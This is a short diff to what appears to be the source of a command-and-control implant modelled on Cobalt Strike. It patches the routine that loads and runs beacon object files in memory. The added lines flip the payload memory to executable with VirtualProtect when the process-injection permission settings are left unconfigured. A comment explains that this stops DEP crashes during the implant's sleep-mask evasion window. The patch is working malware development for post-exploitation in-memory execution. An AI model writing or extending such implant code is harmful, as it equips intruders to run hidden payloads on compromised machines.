@@ -605,6 +605,18 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 		if (code.buffer)
 			memset(code.buffer, 0, code.length);
 		inlinefunc = (void(*)(char * buffer, int length))(code_dst + entry);
+		/* finalize_memory_permissions short-circuits when the two PERMS
+		 * settings are equal (unconfigured profile: 0 == 0), leaving the BOF
+		 * memory plain RW - the mapping view is created without
+		 * FILE_MAP_EXECUTE and allocator 0 VirtualAllocs RW. Executing there
+		 * DEP-faults the process inside the masked window (observed live:
+		 * every sleep_mask-true payload died in its first masked sleep).
+		 * Flip to RX ourselves when finalize would skip; the reuse tail
+		 * flips the page back to RW after the run. */
+		if (setting_short(SETTING_PROCINJ_PERMS_I) == setting_short(SETTING_PROCINJ_PERMS)) {
+			DWORD oldx = 0;
+			VirtualProtect(base, total, PAGE_EXECUTE_READ, &oldx);
+		}
 		if (finalize_memory_permissions(base, total)) {
 			if (conv == 1) {
 				DWORD t = 0;
